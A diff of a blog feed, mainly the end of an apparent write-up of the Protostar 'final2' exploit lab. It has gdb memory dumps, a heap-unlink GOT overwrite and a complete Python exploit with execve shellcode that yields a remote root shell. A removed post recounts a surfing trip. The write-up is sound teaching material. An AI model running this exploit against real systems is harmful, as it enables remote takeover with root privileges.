+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="k">break</span> <span class="o">*</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">186</span>
+</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x804be01</span><span class="p">:</span> <span class="nb">file</span> <span class="n">final2</span><span class="o">/</span><span class="n">final2</span><span class="o">.</span><span class="n">c</span><span class="p">,</span> <span class="n">line</span> <span class="mf">54.</span>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+</span><span class='line'><span class="n">Continuing</span><span class="o">.</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Run the Python script in another terminal. Hit enter to send a third packet that&rsquo;s less than 128
+bytes to break out of the <code>while(1)</code> loop.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">python</span> <span class="n">final2</span><span class="o">.</span><span class="n">py</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">99.107</span>
+</span><span class='line'><span class="o">&lt;</span><span class="n">enter</span><span class="o">&gt;</span>
+</span><span class='line'><span class="n">Process</span> <span class="n">OK</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The gdb session should hit the breakpoint at <code>write()</code>.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">[</span><span class="n">New</span> <span class="n">process</span> <span class="mi">2622</span><span class="p">]</span>
+</span><span class='line'><span class="p">[</span><span class="n">Switching</span> <span class="n">to</span> <span class="n">process</span> <span class="mi">2622</span><span class="p">]</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x0804be01</span> <span class="ow">in</span> <span class="n">get_requests</span> <span class="p">(</span><span class="n">fd</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span> <span class="n">at</span> <span class="n">final2</span><span class="o">/</span><span class="n">final2</span><span class="o">.</span><span class="n">c</span><span class="p">:</span><span class="mi">54</span>
+</span><span class='line'><span class="mi">54</span>    <span class="n">final2</span><span class="o">/</span><span class="n">final2</span><span class="o">.</span><span class="n">c</span><span class="p">:</span> <span class="n">No</span> <span class="n">such</span> <span class="nb">file</span> <span class="ow">or</span> <span class="n">directory</span><span class="o">.</span>
+</span><span class='line'>  <span class="ow">in</span> <span class="n">final2</span><span class="o">/</span><span class="n">final2</span><span class="o">.</span><span class="n">c</span>
+</span><span class='line'><span class="n">Current</span> <span class="n">language</span><span class="p">:</span>  <span class="n">auto</span>
+</span><span class='line'><span class="n">The</span> <span class="n">current</span> <span class="n">source</span> <span class="n">language</span> <span class="ow">is</span> <span class="s">&quot;auto; currently c&quot;</span><span class="o">.</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Examine the first 80 DWORDs. Continue and examine again.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">80</span><span class="n">wx</span> <span class="mh">0x804e000</span>
+</span><span class='line'><span class="mh">0x804e000</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000089</span>  <span class="mh">0x44525346</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e010</span><span class="p">:</span> <span class="mh">0xcccccccc</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e020</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e030</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e040</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e050</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e060</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e070</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e080</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x2f414141</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0xfffffffc</span>
+</span><span class='line'><span class="mh">0x804e090</span><span class="p">:</span> <span class="mh">0x0804d410</span>  <span class="mh">0x0804e014</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e0a0</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e0b0</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e0c0</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e0d0</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e0e0</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e0f0</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e100</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e110</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000089</span>  <span class="mh">0x0000000a</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804e120</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804e130</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+</span><span class='line'><span class="n">Continuing</span><span class="o">.</span>
+</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x0804be01</span> <span class="ow">in</span> <span class="n">get_requests</span> <span class="p">(</span><span class="n">fd</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span> <span class="n">at</span> <span class="n">final2</span><span class="o">/</span><span class="n">final2</span><span class="o">.</span><span class="n">c</span><span class="p">:</span><span class="mi">54</span>
+</span><span class='line'><span class="mi">54</span>    <span class="ow">in</span> <span class="n">final2</span><span class="o">/</span><span class="n">final2</span><span class="o">.</span><span class="n">c</span>
+</span><span class='line'>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">80</span><span class="n">wx</span> <span class="mh">0x804e000</span>
+</span><span class='line'><span class="mh">0x804e000</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000085</span>  <span class="mh">0x0804d534</span>  <span class="mh">0x0804d534</span>
+</span><span class='line'><span class="mh">0x804e010</span><span class="p">:</span> <span class="mh">0xcccccccc</span>  <span class="mh">0x41414141</span>  <span class="mh">0x0804d410</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e020</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e030</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e040</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e050</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e060</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e070</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e080</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x00000084</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0xfffffffc</span>
+</span><span class='line'><span class="mh">0x804e090</span><span class="p">:</span> <span class="mh">0x0804d410</span>  <span class="mh">0x0804e014</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e0a0</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e0b0</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e0c0</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e0d0</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e0e0</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e0f0</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e100</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
+</span><span class='line'><span class="mh">0x804e110</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000089</span>  <span class="mh">0x0000000a</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804e120</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804e130</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Memory at <code>0x804e008</code> and <code>0x804e00c</code> have been changed (to addresses before the heap. I guess
+because it&rsquo;s some special value for the first chunk). Our INT3 instruction is at <code>0x804e010</code>. Let&rsquo;s
+look at the GOT entry for <code>write()</code>.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">i</span> <span class="mh">0x8048dfc</span>
+</span><span class='line'><span class="mh">0x8048dfc</span> <span class="o">&lt;</span><span class="n">write</span><span class="nd">@plt</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">jmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">ds</span><span class="p">:</span><span class="mh">0x804d41c</span>
+</span><span class='line'>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">x</span> <span class="mh">0x804d41c</span>
+</span><span class='line'><span class="mh">0x804d41c</span> <span class="o">&lt;</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;</span><span class="p">:</span>    <span class="mh">0x0804e014</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Its value is the location of our INT3. This means the next call to <code>write()</code> will redirect code
+execution to our INT3 which should cause gdb to break again.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+</span><span class='line'><span class="n">Continuing</span><span class="o">.</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGTRAP</span><span class="p">,</span> <span class="n">Trace</span><span class="o">/</span><span class="n">breakpoint</span> <span class="n">trap</span><span class="o">.</span>
+</span><span class='line'><span class="mh">0x0804e011</span> <span class="ow">in</span> <span class="err">??</span> <span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It worked!</p>
+
+<h2>Crafting the Shellcode</h2>
+
+<p>So now all we have to is insert some real shellcode that&rsquo;ll own the system. Since final2 is running
+as <code>root</code>, let&rsquo;s make the process start a shell. This will allow us send arbitrary commands over TCP
+that get executed as root, i.e. remote code execution. <a href="http://shell-storm.org/shellcode/">Shellstorm</a> has a great library of
+shellcodes. Let&rsquo;s use <a href="http://shell-storm.org/shellcode/files/shellcode-811.php">&ldquo;Linux/x86 - execve(/bin/sh) - 28 bytes&rdquo;</a>. But we have a
+problem. <code>unlink()</code> overwrites the memory at <code>0x804e018</code> (it&rsquo;ll always overwrite four bytes of
+memory eight bytes ahead of whatever address we pick), and no useful shellcode is short enough to
+fit into eight bytes. What can we do?</p>
+
+<p>If the shellcode could only jump past <code>0x804e018</code> to <code>0x804e01c</code> where we have a huge piece of
+contiguous memory. Luckily the <code>jmp</code> instruction (<code>\xeb</code>) does exactly this. Its argument is how many
+bytes to jump over. So our shellcode can start with <code>0xeb 0x0a</code> which moves the instruction pointer
+10 bytes forward. We fill in the middle 10 bytes with <a href="https://www.aldeid.com/wiki/X86-assembly/Instructions/nop"><code>nop</code></a>s (<code>0x90</code>). Our final script will
+be this.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">telnetlib</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="n">REQSZ</span> <span class="o">=</span> <span class="mi">128</span>
+</span><span class='line'><span class="n">HOST</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span><span class='line'><span class="n">PORT</span> <span class="o">=</span> <span class="mi">2993</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># Two bytes for &quot;jmp 0x0c&quot;, two bytes of nop padding to fill out the word,</span>
+</span><span class='line'><span class="c"># eight more nop bytes (second nop DWORD will be clobbered by unlink()),</span>
+</span><span class='line'><span class="c"># then actual shellcode from http://shell-storm.org/shellcode/files/shellcode-811.php</span>
+</span><span class='line'><span class="n">shellcode</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\xeb\x0a\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class="s">&#39;</span> \
+</span><span class='line'>            <span class="n">b</span><span class="s">&#39;</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69</span><span class="s">&#39;</span> \
+</span><span class='line'>            <span class="n">b</span><span class="s">&#39;</span><span class="se">\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31</span><span class="s">&#39;</span> \
+</span><span class='line'>            <span class="n">b</span><span class="s">&#39;</span><span class="se">\xc0\x40\xcd\x80</span><span class="s">&#39;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># These eight bytes will be overwritten by unlink().</span>
+</span><span class='line'><span class="n">ba</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="s">&#39;FSRDAAAA&#39;</span><span class="p">,</span> <span class="s">&#39;ascii&#39;</span><span class="p">))</span>
+</span><span class='line'><span class="n">ba</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+</span><span class='line'><span class="n">ba</span> <span class="o">=</span> <span class="n">ba</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="n">REQSZ</span><span class="p">,</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\x41</span><span class="s">&#39;</span><span class="p">)</span>
+</span><span class='line'><span class="c"># Set the last byte to a &#39;/&#39; for memmove().</span>
+</span><span class='line'><span class="n">ba</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="s">&#39;/&#39;</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">ba</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">ba</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="s">&#39;FSRDROOT/&#39;</span><span class="p">,</span> <span class="s">&#39;ascii&#39;</span><span class="p">))</span>
+</span><span class='line'><span class="c"># Use integer overflow to make dlmalloc think third chunk is four bytes before second chunk.</span>
+</span><span class='line'><span class="n">ba</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;I&#39;</span><span class="p">,</span> <span class="mh">0xfffffffc</span><span class="p">)</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;I&#39;</span><span class="p">,</span> <span class="mh">0xfffffffc</span><span class="p">))</span>
+</span><span class='line'><span class="c"># Add forward and backward pointers</span>
+</span><span class='line'><span class="n">ba</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;I&#39;</span><span class="p">,</span> <span class="mh">0x804d41c</span> <span class="o">-</span> <span class="mi">12</span><span class="p">)</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;I&#39;</span><span class="p">,</span> <span class="mh">0x804e010</span><span class="p">))</span>
+</span><span class='line'><span class="n">ba</span> <span class="o">=</span> <span class="n">ba</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="n">REQSZ</span><span class="p">,</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\x41</span><span class="s">&#39;</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">ba</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
+</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
+</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">python</span> <span class="n">final2</span><span class="o">.</span><span class="n">py</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">99.107</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">Process</span> <span class="n">OK</span>
+</span><span class='line'><span class="n">whoami</span>
+</span><span class='line'><span class="n">root</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>References</h3>
+
+<ul>
+<li><a href="https://medium.com/@iphelix/exploit-exercises-protostar-final-levels-72875b0c3387">https://medium.com/@iphelix/exploit-exercises-protostar-final-levels-72875b0c3387</a></li>
+</ul>
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[How to Analyze Mobile App Traffic and Reverse Engineer Its Non-Public API]]></title>
@@ -4075,66 +5080,6 @@ to that.</p>
 
 
 <div class='image center'><img  src="https://i.imgur.com/ivnVCYXl.jpg" width="480" height="640" title="Sailing close to the Statue of Liberty." ><div class='caption'>Sailing close to the Statue of Liberty.</div></div>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Spotify-organized Surfing Trip in Santa Teresa, Costa Rica 2015]]></title>
-    <link href="https://www.davidxia.com/2016/07/spotify-organized-surfing-trip-in-costa-rica-2015/"/>
-    <updated>2016-07-09T10:13:29-04:00</updated>
-    <id>https://www.davidxia.com/2016/07/spotify-organized-surfing-trip-in-costa-rica-2015</id>
-    <content type="html"><![CDATA[<p>In March 2015, about twenty colleagues and I went on a Spotify-organized surf trip to Santa Teresa,
-Costa Rica for a week of surf lessons. The company, surf, and food were unforgettable. One of Spotify&rsquo;s
-social events organizers knew <a href="www.surfakademin.se">a group of traveling Swedish surf instructors</a>,
-and helped get a group discount for Spotifiers and their guests. The total cost of lodging, lessons,
-and daily breakfast and lunch was about $650 for a week.</p>
-
-<div class='image center'><img  src="https://i.imgur.com/WvJyqW4l.jpg" width="640" height="480" title="The relaxing mini-resort where we stayed. It had a pool, lounge areas, and a small cafe." ><div class='caption'>The relaxing mini-resort where we stayed. It had a pool, lounge areas, and a small cafe.</div></div>
-
-
-<p>The best memories I have from the trip are waking up at the crack of dawn every day, grabbing a
-surf board, and rushing headlong into the water. The sun was gentle in the early morning, but the
-waves were not. The force and speed of the ocean awed and at times terrified me. I&rsquo;d paddle like mad
-to get over waves, but every once in a while, a monster swell would catch me at the worst moment.
-The crest of the wave would hit me like a hammer and sweep me aside like a match stick. I was taught
-to cover my head with my arms to prevent the surf board from giving me a concussion.
-Eventually I learned to do a turtle roll and was able to see a bit ahead of time if a wave would be
-large or small.</p>
-
-<!--more-->
-
-
-
-
-<div class='image center'><img  src="https://i.imgur.com/Lj4BEIel.jpg" width="640" height="480" title="The large suite in which I lived with my two non-Spotify friends I invited: Grace Gui and Jason Alarcon." ><div class='caption'>The large suite in which I lived with my two non-Spotify friends I invited: Grace Gui and Jason Alarcon.</div></div>
-
-
-<p>After a couple of hours of surfing on an empty stomach, I would be ravenous. Our group would trudge
-back to the resort where several Costa Rican women staff members had prepared a large
-breakfast for us: scrambled eggs, watermelon and pineapple,
-salad, rice and beans, and plantains. I&rsquo;d go back for seconds and thirds.</p>
-
-<div class='image center'><img  src="https://i.imgur.com/QQ2zrxil.jpg" width="640" height="480" title="From left to right: Mo Tracey, Fredrik Johansson, Chris Hansen, Jeffrey Foster, David Xia, and Grace Gui." ><div class='caption'>From left to right: Mo Tracey, Fredrik Johansson, Chris Hansen, Jeffrey Foster, David Xia, and Grace Gui.</div></div>
-
-
-<p>One of my colleagues Fredrik and I were pretty good beginners and had the privilege of being invited
-by the instructors to a different beach at least an hour&rsquo;s drive away from the
-resort. Fredrik and I rode in a taxi with one of the instructors and two other guests who were
-seasoned surfers. The ride through dirt and gravel roads was bumpy and hot and all around unpleasant.
-A sandless beach awaited us when we arrived. I lathered on sunscreen to protect against the intense
-midday sun, took my board, and carefully walked across the seemingly endless stretch of sharp rocks
-until I could mount my board and start paddling. After an hour of surfing, I remember being
-exhausted but extremely grateful that I was lucky enough to experience the raw power of mother
-nature in such a majestic setting. I was also extremely grateful I hadn&rsquo;t been injured so far on the
-trip. The waves could be truly terrifying.</p>
-
-<div class='image center'><img  src="https://i.imgur.com/dBL3Hw0l.jpg" width="640" height="480" title="I guess I couldn't keep my balance." ><div class='caption'>I guess I couldn&#8217;t keep my balance.</div></div>
-
-
